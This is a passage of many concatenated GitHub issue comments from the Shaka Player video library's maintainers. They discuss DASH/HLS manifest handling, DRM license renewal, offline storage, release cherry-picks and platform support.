can do about that.  If the hardware only supports one video element at a time, we can't keep the content buffered in MediaSource during the ad break.\nI'm sorry to give you bad news.  Please let us know if we can do anything else for you.. I believe we try the key systems with license servers before the others.  If no license-server-configured key systems work, we only try the others so we can give a more useful error message (no license server vs unsupported config).  This is from memory, though.  I could be wrong.\nI think misleading error messages should be removed.  If there is a usable key system with a configured license server, there is no reason for a \"no license server\" error message to appear.. Cherry-picked for v2.3.3.. The \"no-cors\" mode is pretty restrictive:\nQuoting MDN:\n\nno-cors \u2014 Prevents the method from being anything other than HEAD, GET or POST, and the headers from being anything other than simple headers. In addition, JavaScript may not access any properties of the resulting Response.\n\nQuoting the spec on \"simple headers\":\n\nA CORS-safelisted request-header is a header whose name is a byte-case-insensitive match for one of:\n Accept\n Accept-Language\n Content-Language\n Content-Type and whose value, once extracted, has a MIME type (ignoring parameters) that is application/x-www-form-urlencoded, multipart/form-data, or text/plain\n\nSo \"no-cors\" mode precludes Range requests, which are frequently required for DASH VOD content.  It also would prevent us from reading responses, which means we would not be able to use response filters, TS-to-MP4 transmuxing, EMSG event support, or subtitle support.\nIn my estimation, \"no-cors\" mode is simply too restrictive for Shaka Player.  If you have a compelling reason to need it, we can reconsider.. Could you update that test as well?  Thanks!. Merged.  Thanks!. Cherry-picked for v2.3.3.. I stand corrected.  Thanks!. I added it to the backlog for now.  We will be doing v2.5 planning as soon as v2.4 comes out, but v2.4 is already too large.. Cherry-picked for v2.3.3.. I am making plans to remove the requirement that Player have a video element upfront.  This would mean Storage depending on Player would no longer imply the need for a video element.\nStorage still uses Player for a NetworkingEngine, which has the advantage of an application only needing one set of networking filters for both storage and playback.\nStorage also uses Player for DRM, manifest, and retry configs, which has a similar advantage.  Only one config needs to be given for both storage and playback.\nWe could go further and allow Storage to create/own its own NetworkingEngine and own its own copy of the complete player config, but I'm reluctant to do that because of the complexity of the configs.  We would need to manage a (nearly) complete copy of the Player config structure, possibly with different values, and we might also need to merge that with the existing offline config owned by Storage today.\nIf we did all of that, we could still have an optional link to a Player, which would provide a default config and shared NetworkingEngine for convenience.. Good idea.  I'll let @vaage have the final say, though, as he is already deep in the implementation.. You could try something like this, which doesn't rely on the streaming event:\njs\nconst startTime = 60; // some start time in seconds\nplayer.load(manifestUri).then(function() {\n    const end = player.seekRange().end;\n    if (startTime < end) {\n        player.getMediaElement().currentTime = startTime;\n    }\n});\nDoes this help?. If you can, upgrading is rarely a bad idea.  At the very least, try the most recent bugfix release from the v2.2 branch, v2.2.10.  Otherwise, you should try the very latest, which is currently v2.3.2.\nIt could be that some of these approaches fail because of bugs we've already fixed in newer releases, so I suggest you try an upgrade before we go further.  Upgrade guides can be found here: https://shaka-player-demo.appspot.com/docs/api/tutorial-upgrade.html\nIf upgrading your entire project is going to be too time-consuming for you right now, you could always just try building a very simple demo on top of the latest release using the sample code you posted above.  That should be cheap and easy, and will tell you whether your approach makes sense and whether an upgrade will help with this particular issue.. Seeking during the 'streaming' event doesn't work because we haven't put opt_startTime into effect yet.  I would expect that seeking after load() resolves would still work, but it doesn't.  Delaying the seek another 100ms after load() resolves works on my workstation, but that is not a good fix.\nIt is surprising that we override a seek that occurs after load() is resolved, so I'll go ahead and mark this as a bug.  I'm not sure exactly what is causing it, though.. Fix cherry-picked to v2.3.5.. Cherry-picked for v2.3.3.. We will also need to consider how pause/resume interacts with background fetch in #879.. > Since my ad is 73.045 Seconds long and my duration is 4.096 -- Download must stop at D00000017.m4f. Shaka keeps going though and tries to download a D00000018.m4f -- Since this slice doesn't exist playback of course breaks.\nOkay, that makes sense.  I agree with the math.\nBut since the ad period doesn't have a duration in the manifest, we don't know how that it's 73.045 seconds long until there's another period following it.  I'm guessing, but by that time, we may already have tried to buffer that non-existent segment.\nMaybe this is a silly question, but if you know the ad period is 73.045 seconds, why not put that in the ad period's duration attribute?\n\nSo I the way I understand the spec, the MinimumUpdatePeriod determines the length of that last period - Potentially Extending it over and over again. In my case I am going to have a 73.045 second period, but it increases by at most the minimum update period of ~20 seconds 3 times before a new period shows up to set the absolute length of the period.\n\nI haven't re-read the spec or IOP since we started this conversation, but that's not how we interpret it.  We treat minimumUpdatePeriod as how often to update the manifest, period.  It doesn't have anything to do with the length of a period.\nNow, if we were generating a segment list from SegmentTemplate+duration every time we parsed a manifest update, it might work the way you are suggesting.  But instead, we have these functions that calculate segment references on-the-fly:\n```js\n  let find = function(periodTime) {\n    if (periodTime < 0)\n      return null;\n    else if (periodDuration && periodTime >= periodDuration)\n      return null;\nreturn Math.floor(periodTime / segmentDuration);\n\n};\n  let get = function(position) {\n    let segmentStart = position * segmentDuration;\n    // Cap the segment end at the period end, to avoid period transition issues\n    // in StreamingEngine.\n    let segmentEnd = segmentStart + segmentDuration;\n    if (periodDuration) segmentEnd = Math.min(segmentEnd, periodDuration);\n// Do not construct segments references that should not exist.\nif (segmentEnd < 0)\n  return null;\nelse if (periodDuration && segmentStart >= periodDuration)\n  return null;\n\nlet getUris = function() {\n  let mediaUri = MpdUtils.fillUriTemplate(\n      template, id, position + startNumber, bandwidth,\n      segmentStart * timescale);\n  return ManifestParserUtils.resolveUris(baseUris, [mediaUri]);\n};\n\nreturn new shaka.media.SegmentReference(\n    position, segmentStart, segmentEnd, getUris, 0, null);\n\n};\n```\nUntil the next content period appears, periodDuration here is null, so there is no cap on the segments we think we can find in that period.\nAll that said, I don't expect we should fail, even if we try to buffer ahead to a non-existent segment.  When the new period shows up, ideally, we would recognize that we had buffered to the end of the ad period already, and move on to the next period.. At this point, it's difficult to understand what's happening until we can reproduce it locally and debug it directly.  Can you provide us with some way to reproduce ths issue?. We could discuss it from a spec point of view, but that's largely academic if everything plays correctly.  A counterexample would be helpful.. If you can recommend a way to disambiguate when period IDs are reused, I would consider it.  It's really just about matching the new manifest to the old one on update.. Hrm... We have someone else asking us to in #1341 to allow the period start time to change, which is apparently allowed by the spec currently.  But in https://github.com/Dash-Industry-Forum/DASH-IF-IOP/issues/160, they are discussing disallowing the changing of period start, which would be more practical and in line with our current requirements.. Okay, that works for me.. We have to infer a lot of things in HLS, unfortunately.  I'm not sure how complicated this will be, but we'll take a look.. @avelad, can you provide sample content?  What is the actual audio codec in this case?  What are we meant to infer?. This is intended, and is consistent with built-in HLS support in Safari.\nCan you give us some details on how you expected it to work?. We can probably make this configurable, and make it apply to all live streams (DASH & HLS).  By default, we would allow seeking to any segment we know about.  The other option would be to disallow live stream seeking, as we do today for HLS live.. Yes, the default behavior is intentionally the same as in 2.4.2.  This change gives you an explicit override, for both DASH & HLS.\n@avelad, try setting the override to Infinity.  Does that get you the full seek range you want?. I think this feature is not working correctly.  I will reopen and investigate.. The override set by the player after the initial manifest is parsed is wiped when a live manifest is updated.. @avelad, can you please try again with the latest code?  I believe we have fixed the issue.. Actually, we've just discovered what appears to be a related bug in the HLS parser.  Setting availabilityWindowOverride to Infinity does what I would expect in DASH: the segments that appear in the manifest can all be seeked to.  This is not the case for HLS.  Right now, with the same setting and an HLS live stream, the seek range includes all segments that have ever existed, including ones that don't appear in the playlist any longer.  We should be able to fix this.  @theodab will investigate.\nSorry for the inconvenience.  I think (hope?) this should be the last change required for this.. That's a limitation of <input type=number>.  You could use a sufficiently large number in the demo, such as 9999999999 (larger than the current Unix time in seconds).. @TheModMaker, you are right.  For HLS, there is no difference between a window override of Infinity and my plans for #999.  For DASH, it is a bit different.  Until #999 is solved, the DASH live edge is based on availabilityStartTime, not the segment list.  For HLS, it is already based on the segment list.. Sounds reasonable.  Thanks!. Cherry-picked for v2.3.3.. getStats() works in all modes: compiled, debug, and uncompiled.\nHere are the docs for the method: https://shaka-player-demo.appspot.com/docs/api/shaka.Player.html#getStats\nAnd the docs for the return structure: https://shaka-player-demo.appspot.com/docs/api/shakaExtern.html#Stats. Closing due to inactivity.  Let us know if you need anything else.. Here are some numbers from my analysis:\nAt time 1519673732 (seconds since 1970 UTC, the unix epoch), I fetched your manifest.  At that moment, availabilityStartTime was 1970-01-01T00:00:00.000Z (same as the unix epoch) and the video segments were described as:\nxml\n  <Period id=\"5074585002895\" start=\"PT1519672808.560S\">\n    <AdaptationSet mimeType=\"video/mp4\" ...>\n      <SegmentTemplate\n          timescale=\"90000\"\n          initialization=\"$RepresentationID$-Header-1519672026560.m4s\"\n          media=\"$RepresentationID$-0-T-$Time$.m4s\"\n          presentationTimeOffset=\"5074655382895\">\n        <SegmentTimeline>\n          <S t=\"5074655382895\" d=\"180000\" r=\"449\"/>\n        </SegmentTimeline>\nThe live edge is now, which is 1519673732 seconds since availabilityStartTime.  So the most recent segment should have roughly this timestamp in seconds.\nThe first segment has timestamp 5074655382895 (in timescale units), and the last segment has start time 5074655382895 + 180000 * 449 = 5074736202895.  We then subtract the presentationTimeOffset of 5074655382895 (also in timescale units) to arrive at 80820000 in timescale units.\nConverting 80820000 from timescale of 90000 to seconds yields 898 seconds.  We then add the period start time of 1519672808.560 seconds and get 1519673706.560 seconds.\nHow far is that from \"now\"?  We subtract the time the request was made (1519673732) and get -25.44, so this is 25.44 seconds in the past.\nSo the timestamps are not that far off.  Probably, you just need a suggestedPresentationDelay attribute to cover up this lag.  A value of 30s might suffice.\nTo test this theory, I seeked backward by about 45 seconds and playback started.\nIt's not clear why playback didn't start without this action, though, and the JS console still spits out many warnings:\n```\nstreaming_engine.js:1330 (video:1) cannot find segment: currentPeriod.startTime=1519673416.56 lookupTime=933.4669899940491\nstreaming_engine.js:1330 (audio:8) cannot find segment: currentPeriod.startTime=1519673416.56 lookupTime=933.4669899940491\nsegment_index.js:163 Refusing to rewrite original references on update!\nsegment_index.js:323 Assertion failed: SegmentReferences are incorrect\n```\nI'll dig deeper and let you know what I find.. A side-note: in this case, HTTP_ERROR 1002 is caused by your manifest being an http URL and the demo app being an https URL.  This is a \"mixed-content\" error, in which https origins can't load plain http resources.. Although the timestamps all make sense in a single snapshot of your manifest, comparing over time reveals problems.\nFirst snapshot:\nxml\n  <Period id=\"5075233002895\" start=\"PT1519679226.561S\">\n    ...\n      <SegmentTemplate\n        timescale=\"90000\"\n        initialization=\"$RepresentationID$-Header-1519679226561.m4s\"\n        media=\"$RepresentationID$-0-T-$Time$.m4s\"\n        presentationTimeOffset=\"5075233002895\">\n        <SegmentTimeline>\n          <S t=\"5075233002895\" d=\"180000\" r=\"449\"/>\n        </SegmentTimeline>\n      </SegmentTemplate>\nSecond snapshot, a couple seconds later:\nxml\n  <Period id=\"5075233002895\" start=\"PT1519679232.561S\">\n    ...\n      <SegmentTemplate\n         timescale=\"90000\"\n         initialization=\"$RepresentationID$-Header-1519679226561.m4s\"\n         media=\"$RepresentationID$-0-T-$Time$.m4s\"\n         presentationTimeOffset=\"5075233542895\">\n        <SegmentTimeline>\n          <S t=\"5075233542895\" d=\"180000\" r=\"449\"/>\n        </SegmentTimeline>\n      </SegmentTemplate>\nThe timestamps are changing (period start and first segment time), but in both snapshots, these appear to be the same segment.  You should use the startNumber attribute to indicate the position of the first segment listed, and you should not change the period start time.\nI recommend you change:\n  - Add startNumber and keep it updated to reflect the first segment listed in <SegmentTimeline>\n  - Make Period@start fixed (at 0, perhaps)\n  - Adjust your use of presentationTimeOffset with respect to your adjustment of Period@start\n  - Add suggestedPresentationDelay to cover the lag in serving the content. startNumber is optional in some circumstances, but not in this case.  If segments were never dropped from the list, startNumber could default to 1.  But if your segment list changes, your startNumber must be updated to reflect that.  Otherwise, there is no (easy) way to correlate one list to another to merge them.\nsuggestedPresentationDelay is truly optional, but highly recommended.  You should decide what your presentation delay will be, to handle lag properly and keep clients from buffering at the edge.  If you omit this from the manifest, we will provide a default.  You can configure this default value at runtime with the key manifest.dash.defaultPresentationDelay.\nPeriod@start must be fixed, so it is the other things which must be adjusted as time passes.. Does this answer all your questions?. Okay, sounds good.  Just let us know when you've heard back.. We are working on a couple of issues that might be related.  We have just discovered some corner cases in which playback doesn't start properly.  You might be running into one of these same issues.\nI would recommend trying again with our nightly build after we close #1298 and/or #1331.\nDo you have an updated URL we can use to reproduce your issue with the updated streams?  We could double-check for you if our fixes-in-progress for #1298 and #1331 will be effective for this issue, rather than you having to wait for the fixes for those to be released.. #1298 and #1331 have been fixed.  Can you try again with the latest code from master?. Okay.  We will mark as a duplicate and close the issue for now.  If you find other failures, you can ask for the Shaka bot to reopen the issue by saying @shaka-bot reopen.  The fixes for #1298 and #1331 will appear in v2.3.5.  Thanks!. @hdodev, I can't access your stream due to CORS errors.  Can you please add appropriate CORS headers in your web server?. TTML parser fix cherry-picked for v2.3.3.  The remaining issues are in the documentation template, not Shaka Player.. The vulnerable expressions in jsdoc are all from the \"prettify\" module, which enables syntax highlighting for CSS.  https://github.com/jsdoc3/jsdoc/tree/master/templates/default/static/scripts/prettify\nThat code seems to have been forked in 2012 and never updated.  The original code has been updated a few times since then:  https://github.com/google/code-prettify/commits/master/src/lang-css.js\nI will put together a bug report against jsdoc for this, and a pull request to update, if I can.. We have fixed the regex issues that affect our library, but there are others in our jsdoc template.  We're leaving it open until we fix those, too.\nOur template is forked from the jsdoc default template, and the relevant code in jsdoc was forked from prettify (and never updated).  If we do fix these issues in the template ourselves before jsdoc and prettify do, we can upstream the fix.. This also connects with #879, in which this pause/resume concept will be handled by background fetch.  I'm not against giving apps an explicit API to pause/resume, but the ultimate design needs to consider all of this.. I'm sorry, but we will need to put this on hold until we close #1248.  I also apologize that we don't have a document showing the plan for that.\nThank you for contributing, though.  If you are still interested in implementing this after we finish transforming the internals of our storage system, we would be happy to discuss a design in #1301.  Thanks!. With the nightly build?  Or a release version?. No, it does not.  I don't believe there is any way to support RTMP streaming from JavaScript, given that we are largely restricted to HTTP transport and the containers and codecs supported by MediaSource.. @asifagaria, does this answer your question?  Anything else we can do for you on this issue?. Repro steps:\n\nVisit https://shaka-player-demo.appspot.com/demo/#asset=//storage.googleapis.com/shaka-demo-assets/sintel-mp4-only/dash.mpd;lang=en-US;play;build=uncompiled\nvideo.pause();\nvideo.currentTime = 210;\nshakaDemo.localPlayer_.setTextTrackVisibility(true);\n\nSubs should appear right away, and they do in Chrome 64 on Linux.. Works on Safari 11.0.3 (13604.5.6) on macOS High Sierra.\n@DanDeMicco, I'm unable to reproduce this issue with the steps I detailed.  Is this still an issue for you?  Are there some different steps that you are following?. I can reproduce the issue with v2.3.2, but not with v2.3.3 (released yesterday).  Can you try this newer release?. No problem.  Happy to help!. @TheJohnBowers, this fails to play for me at all.  What particular commit of Shaka Player are you using?. I'm getting failed assertions in StreamingEngine with the content you linked to.. Cherry-picked for v2.3.3.. The part about 'waitingforkey' is clearly out of date and should be fixed.  We used to listen for 'waitingforkey' events specifically to detect a situation when the license server or proxy had a bug and the wrong keys were delivered.  We ultimately had to remove that feature because of false negatives.\nI think the other details are out of date, as well.\nAs you noted, all keys in a session have the same expiration time, so they all become expired at once.  But keys in different sessions can expire separately.\nAlthough our docs say \"any key in any active session\", the current behavior is that we fire the EXPIRED error when every known key from every MediaKeySession in this playback (including ones from the past which we closed already) have the \"expired\" status.  So it would be better to say something like:\n\nThe license has expired. This is triggered when all keys in the key status map have a status of 'expired'.\n\nWhat do you think?. (Happy to have a PR, BTW). Cherry-picked for v2.3.3.. Correct.  Renewal is triggered by a CDM-initiated message event.  We do not request a new license when the old one expires.\nWe make certain assumptions based on Widevine recommendations and the typical structures we see from applications and content owners.  Expiration and renewal are policies that content owners control.  A few of typical setups are:\n  - Typical VOD: License expires after X minutes, which can be extended through renewal.  Renewal is attempted Y minutes (Y < X), so renewal would have to fail (X/Y)-1 times in a row before we risk an expiring license.\n  - Typical offline: License expires X minutes after playback begins, with no renewal.  The user is expected to complete watching the content by then.\n  - Typical live: License rotates every X minutes, which causes us to create a new session every X minutes.  Old sessions expire after X * Y minutes (some multiple), at which point they get closed.  There will be up to Y overlapping sessions at any time.  Renewal is not used.\nIn general, renewal is a tool for concurrency detection.  If a content owner wants to keep track of how many clients are watching movies under the same user credentials, they can observe renewal attempts within a certain window and set a threshold, above which they suspect account sharing or related forms of abuse of their service.  By setting a short license expiration (say, 5 minutes) and a shorter renewal period (say, 1 minute), an abusive user cannot watch for more than 5 minutes without getting an updated license.  A well-behaved user would have a quick exchange with the server every minute, and could tolerate up to 4 renewal failures without interrupting playback.\nIf there is another use-case that we're missing in which content should be automatically relicensed after expiration, rather than using license renewals during playback, please let us know so we can discuss the requirements.. Rotation is different from renewal.  In renewal, a 'message' event triggers the renewal exchange, which results in the original license/session being extended.\nIn rotation, an 'encrypted' event triggers the creation of a new session, which is typically deliberately short-lived.\nThis means that if you have a PSSH in the manifest, key rotation will break, because we follow the DASH guideline that the PSSH in the manifest supercededs any that might appear in the content itself.  So if there is a PSSH in the manifest, we don't listen to the 'encrypted' event at all.  See #1107 for more.. Understood.  Let us know if there are ways we can be more flexible to accomodate different paradigms.. Sounds reasonable.  What do you think the configuration would look like?. Sounds good to me.  Thanks!. Yes, that's right.  We only do it once, on the assumption that your clock won't signficantly desync over the course of one playback session.. No worries.  I didn't remember that it worked that way, and I didn't check when you proposed the change.. No, you correctly understand the policy.  But when we were getting rid of \"var\" by using a massive \"sed\" script, \"let\" was safer.  So the times you see \"const\" today, those were done by hand.  Most of the \"let\" you see today were written by a regex.\nWe followed an outdated, pre-ES6 style guide until we started incorporating ES6 into our project.  We are still transitioning in terms of style.. Confirmed.  The cause is a little bit subtle, though.  The issue is not in AbortableOperation so much as in the way it's used in one particular part of NetworkingEngine.\nWe chain the operations together, so a failure in one ripples to the end, just like you would find in a Promise chain:\njs\n  let responseFilterOperation = requestOperation.chain(\n      (response) => this.filterResponse_(type, response));\nBut it's this pattern which causes the problem:\njs\n  requestOperation.promise.then(() => {\n    responseFilterStartTime = Date.now();  \n  });\nHere we have created a fork in the Promise chain.  So the error is actually caught in the chain of operations, but not in this particular fork of the underlying Promise chain.\nHere's some terrible ASCII art to illustrate:\n(Operation 1: A -> B -> C -> D) -> (Operation 2: E -> F -> G -> H) -> finalPromise\n                              \\-> Fork1                          \\-> Fork2\nWithin the operation chains, each Promise (A through H) is properly terminated, but not on the forks.. I've turned up a couple other cases, as well.  If we don't explicitly handle rejection on abort (which, for example, we may not when destroy() is called), there are some uncaught promise rejections then, too.\nThere are also some tests which do not catch rejections when testing failure cases.. The only way to test that we cleaned up unhandled rejections in NetworkingEngine is to turn those into test failures.  Doing that globally turned up several issues all over the code base, some of which might be actual bugs.. The fix will appear in v2.4, because v2.3.x does not have AbortableOperation.. Cherry-picked for v2.3.3.. I expect not, based on your experience.  I don't have an authoritative answer, though, and I would guess that this may vary from one DRM system to another.. Releasing an offline license may involve a license exchange with the server.  We tell the CDM (through EME) that we want to remove a persistent license session, and the CDM may send us a license release message.  If so, we have to send it to the server and get a response to give back to the CDM.  Until that process is complete, the offline license sticks around.. The ideal behavior, I think, would be that you can always delete the content while offline.  If the license still needs to be released, we should have some way of tracking licenses that need release and trying to release them once we are back online.\nI'll mark this as an enhancement and rename it to that effect.  Thanks!. In Shaka v1, we used to require applications to manage the list of stored contents itself.  In the end, it seemed to be too big a burden on applications.  Because of this experience, I would prefer not to push license management onto applications.\nIdeally, we could manage license release internally without creating additional APIs for the application and without requiring apps to track these themselves.  For streaming playback, we hide license management inside DrmEngine.  I don't see why it should have to be different for offline.\nObviously, we will need to design this, and it will impact the storage system in some way.  I've put this feature on the backlog for now, and we'll work out a design before we jump into implementation.. Released in v2.5.0-beta2.. On Chrome, the VP9 streams are selected over the H.264 streams, because the VP9 streams have a lower bitrate.  This is a feature of Shaka Player's multicodec content support.\nOn Safari, VP9 is not available, so we fall back to H.264.  Compared to VP9, H.264 requires a higher bitrate to achieve the same visual quality.\nIf you try any non-multicodec content, you will see consistent bitrates across browsers.\nDoes this help?. Currently, we require a manifest such as DASH or HLS.  We do not play back individual files, such as these webm files, because these are not supported through MediaSource.  We currently only do playback through the MediaSource API.\nWe have an open feature request to add support for single files (https://github.com/google/shaka-player/issues/816) but we are still working toward that.  There are many foundational things that have to change for this, and it will take some time to get there.  You can follow #816 if you are interested to track progress.\nThanks!. I believe you've filed this bug on the wrong repository.  This is Shaka Player.  I think you want the Shaka Packager repo: https://github.com/google/shaka-packager/issues/new. We have never tested Shaka Player on this platform, but you can help by running our support page and sending a screenshot:  https://shaka-player-demo.appspot.com/support.html\nThis will tell us whether or not the platform has the basic capabilities we need, and if so, what specific containers, codecs, and DRM systems it has.. If you can send us some documentation on WebOS testing, we could consider adding a WebOS device to our test lab.  We can't call it an officially supported platform until we are running tests on it nightly to make sure we don't break it.  But in general, expanding our platform coverage is a Good Thing:tm:.\nIn particular, we would appreciate any tips on how to automate directing the device to an arbitrary URL.  That's a key part of the testing process with Karma.. Sure thing.  I've renamed the issue to reflect that.\n@chrisfillmore, based on your support report, I see no reason WebOS shouldn't work.  If you can confirm what version of WebOS you have, that would be helpful.  @avelad reports that WebOS 3.5 works for him.\nFor this to be an officially supported platform, and not just a platform that happens to work, we will need to add a WebOS device to our lab environment and integrate it with our test automation.  None of that work will affect the open-source library unless we need to adjust any of the tests themselves.\nThe open question is what version of WebOS we should try to put in our lab.  Ideally, we would test on the oldest version we intend to support, which may be 3.5.  @chrisfillmore, @avelad, we would be happy to have your input on this.\nThe other issue is that we may be limited in the WebOS version we can actually purchase.  For example, when we tried to purchase a Tizen 2016 TV, we could only find 2017 models in stores.  It seems that WebOS 3.5 models are still available, but I'm not sure about earlier models.. Cool, thanks for the feedback, @avelad!. Very much, yes!  Thank you!. See also https://github.com/google/shaka-player/issues/1307#issuecomment-370085868. Fix cherry-picked for v2.3.4.. I am still seeing this bad behavior in v2.3.4.. It can be reproduced by either playing the live \"history\" stream in HLS, or by playing the DASH version with startTime set to 0 in load().. So it seems to be more about playing at the front of the seek range, rather than in live HLS specifically.. In the DASH version, the repeated seeks stop if I manually seek forward by about one half second: video.currentTime += 0.5.. You can also reproduce in DASH live by pausing, rewinding to the beginning of the stream, letting the playhead fall outside the seek range, then unpausing.. Fix cherry-picked to v2.3.5.. There does not appear to be an event to tell us when the native controls have been used to change the text track mode: https://html.spec.whatwg.org/multipage/media.html#texttrack\nPerhaps we could add a configuration option, such that if enabled, we would stream regardless of text track state, as we used to do.  With this option enabled, native controls could be used with text.  Our demo app could set this option when native controls are toggled in the UI.. I think I closed this too soon.  The new configuration still needs to be used by the demo app.. Cherry-picked for v2.3.4.. Since discontinuities happen inside the media playlist, I expect that the ad segments would need to be the same across media playlists.  Any matching of N content streams to M ad streams would have to be done server-side.\nThe same thing in DASH is more complex, because the matching on N content streams in one period to M ad streams in the next period would have to be done client-side.\nHere's an example using your scenario, where there is only one ad resolution and language, but multiple video resolutions and audio languages for the main content:\n```\nMedia playlist, 720p video\nEXTINF:2\nv-720-500.mp4\nEXTINF:2\nv-720-501.mp4\nEXT-X-DISCONTINUITY\nEXTINF:7\nv-ad-1.mp4\nEXTINF:7\nv-ad-2.mp4\nEXTINF:7\nv-ad-3.mp4\nEXT-X-DISCONTINUITY\nEXTINF:2\nv-720-502.mp4\nEXTINF:2\nv-720-503.mp4\n```\n```\nMedia playlist, 480p video\nEXTINF:2\nv-480-500.mp4\nEXTINF:2\nv-480-501.mp4\nEXT-X-DISCONTINUITY\nEXTINF:7\nv-ad-1.mp4\nEXTINF:7\nv-ad-2.mp4\nEXTINF:7\nv-ad-3.mp4\nEXT-X-DISCONTINUITY\nEXTINF:2\nv-480-502.mp4\nEXTINF:2\nv-480-503.mp4\n```\n```\nMedia playlist, English audio\nEXTINF:2\na-en-500.mp4\nEXTINF:2\na-en-501.mp4\nEXT-X-DISCONTINUITY\nEXTINF:7\na-ad-1.mp4\nEXTINF:7\na-ad-2.mp4\nEXTINF:7\na-ad-3.mp4\nEXT-X-DISCONTINUITY\nEXTINF:2\na-en-502.mp4\nEXTINF:2\na-en-503.mp4\n```\n```\nMedia playlist, French audio\nEXTINF:2\na-fr-500.mp4\nEXTINF:2\na-fr-501.mp4\nEXT-X-DISCONTINUITY\nEXTINF:7\na-ad-1.mp4\nEXTINF:7\na-ad-2.mp4\nEXTINF:7\na-ad-3.mp4\nEXT-X-DISCONTINUITY\nEXTINF:2\na-fr-502.mp4\nEXTINF:2\na-fr-503.mp4\n``. @damienlevin, thanks!  We will make sure not to miss that.. Updated.  Thanks for catching that!. I'm not, but it appears that the dist/ folder in our v2.3.3 release is empty.  I'm not sure how this could happen, but I'll look into it.  v2.3.2 has a populated dist/ folder.. Strange.  If I runnpm install shaka-playerand I get a dist/ folder that only contains deps.js.  If I runnpm install shaka-player@XwhereXis one of[2.3.0, 2.3.1, 2.3.2, 2.3.3]`, I get a fully populated deps folder.\nI have no idea why that is happening, but it's consistent.  Maybe I'm seeing an npm bug.  It seems to be unrelated to what @yairans is reporting, though, so please disregard.. Fix cherry-picked for v2.3.4.. I consulted with the Widevine CDM folks, and system code 70 seems to indicate that you are trying to load a session which is already in use.  The session created by loadInternal() might need to be closed at the end of your Promise chain.. Happy to help!  Please feel free to send a PR if you have something you'd like to share.. The docs for that error code are unclear: https://v2-3-3-dot-shaka-player-demo.appspot.com/docs/api/shaka.util.Error.html#value:9009\nThey currently state:\n\nWhen the manifest contains no period playable streams, it means the manifest is unsupported by the browser.\n\nBut they should say something more like:\n\nThe content container or codecs are not supported by this browser.  For example, this could happen if the content is WebM, but your browser does not support the WebM container, or if the content uses HEVC, but your browser does not support the HEVC codec.\n\nIf you can provide the manifest and license server URIs we requested in the issue template, we could help you understand what container/codec is not supported in your case.  Can you provide us with the manifest URI?\nI will update the docs for that error code.. We also appear to have made a mistake in the error code.  The 9000's are used for offline storage problems, which this is not.  It should have been assigned an error code in the 4000's.. Do you mean 2.2.8?  2.8.8 is still in the future at this point.  :-). @chrisfillmore, is this the same app as @shanmugapriyaEK?  Or just a similar result in a separate app?. Since the docs have been clarified for the error code, I've removed the \"docs\" label and put this back into the triage queue.  We will try to reproduce the issue on IE and see if there is something that needs to be fixed in the library.. Wonderful, thanks.  That's useful information, as is the bit about the XML parsing.  We will look into it soon.. Understood.  Thanks!. You may want to compare results with the uncompiled, debug, and release builds:\nhttps://shaka-player-demo.appspot.com/demo/#build=uncompiled\nhttps://shaka-player-demo.appspot.com/demo/#build=debug_compiled\nhttps://shaka-player-demo.appspot.com/demo/#build=compiled. Shadow DOM doesn't sound right to me.  Could there be a polyfill installed by one of those?  Perhaps over Element, Node, or DomParser?. Thanks!  Since you have narrowed in down to webcomponentsjs, I'm going to let you continue the investigation on your own.  I don't think we'll have much to contribute since we have no experience with that library.  Sorry we weren't able to help with this one, but I'm glad you're making progress.  Let us know if there's anything we can offer.. Error code docs update for cherry-picked for v2.3.4.. @chrisfillmore, do you have a bug link with webcomponentsjs that we can track?  Or since you mentioned that it was \"an old version\", have you managed to solve this by upgrading webcomponentsjs?. Sounds good.  Thanks!. Great, thanks!. To be completely fair to dash.js, there are several things they support which we don't:\n - DASH manifests with no segment index information\n - codec-switching across periods\n - SmoothStreaming support\n - typescript definitions\n - thumbnails for seeking\n - probably other DASH features we are missing\n@TobbeEdgeware, do you have anything to add?  Can you recommend any other dash.js contributors/committers who may want to speak for its advantages?  I'm all for a fair comparison, as I'm sure Shaka Player isn't the best tool for every situation.. I'll try to summarize everything so far, and add a few links to ongoing work in Shaka that might be relevant.  We had a few misconceptions about dash.js which @epiclabsDASH, @TobbeEdgeware, and @wilaw were kind enough to correct for us.  Thanks!\n\nDASH: supported by both players\nHLS: supported in Shaka; dash.js is open to this in the future\nMSS: supported in dash.js; Shaka community is working on this (#703)\nNetwork request filters: supported by both players\nNetwork response filters: supported by Shaka; work in progress for dash.js\nCustomization/plugins: both players allow for customization of behavior, but with different mechanisms\nGap jumping: now supported in both players as of the next dash.js release (v2.6.7?)\nMulti-period: single presentation in Shaka Player, so codecs may not change; period transitions work differently in dash.js, which allows for codec changes\nTolerance for bad content: both players tolerate certain non-compliant content, but with different specifics\nOffline storage and playback: Shaka Player only\nCast support: built into Shaka Player for sender and receiver; sample code provided by dash.js for sender and receiver\nProduction-ready: both players are production-ready and used in by many people in both commercial and non-commercial projects\nCross-browser: both players are tested on various browsers and intend to provide a consistent cross-browser experience\niOS support: work in progress for Shaka Player (#997); no support in dash.js\nsrc= support: work in progress for Shaka Player (#816); no support in dash.js\nFairPlay support: work in progress for Shaka Player (#382); on the dash.js backlog (https://github.com/Dash-Industry-Forum/dash.js/issues/855)\nDASH manifests with no segment index information: dash.js only\nTypescript definitions: supported in dash.js; Shaka community is working on this (#1273)\nThumbnails for seeking: supported in dash.js; Shaka has this on the backlog (#559)\nPWAs & service workers: demo provided by Shaka; no support in dash.js\nPreload: supported in dash.js; work in progress for Shaka Player (#880)\nInband events, emsg boxes: supported by both players\nABR: Shaka Player's default is throughput-based; dash.js incorporates dropped frames and buffer fullness\nCEA 608 captions: supported by both players as of Shaka's upcoming v2.4\nImage-based subtitles: supported by dash.js; Shaka has this on the backlog (#1089)\n\n\nBy the way, it is great that users have these two high quality open source players to choose.\n\nHear, hear!  It's a good time to be in video.\n@subhranshudas, does this answer your question?  (Possibly in more detail than you cared for.  :grin:). I don't see why we couldn't, but it will be a bit of extra work for us to maintain it.  If we can automate the process of extracting the parser from Shaka Player releases and releasing a package for the parser with an equivalent version number, that might help.  Although it occurs to me that the versioning probably couldn't be the same as the player.  For the player, the DASH parser is an internal component, so changes to the parser API or the manifest format don't break backward compatibility for Shaka Player itself.  With semantic versioning, changes to the DASH parser or manifest format would require a major version bump in its package.\nDo you have any requests for what the package interface should look like?  The parser today essentially takes a URL and returns (asynchronously) a hierarchical object representing the parsed manifest.. Putting this request on the backlog for now, pending details on the interface and ideas about how to automate the releases.. Another issue we would have to deal with is security.  Today, Shaka Player as a whole requires MediaSource and a browser environment, so we benefit from sandboxing and process isolation.  Running the DASH parser alone in a nodejs environment means that we would have to take greater care and be proactive about 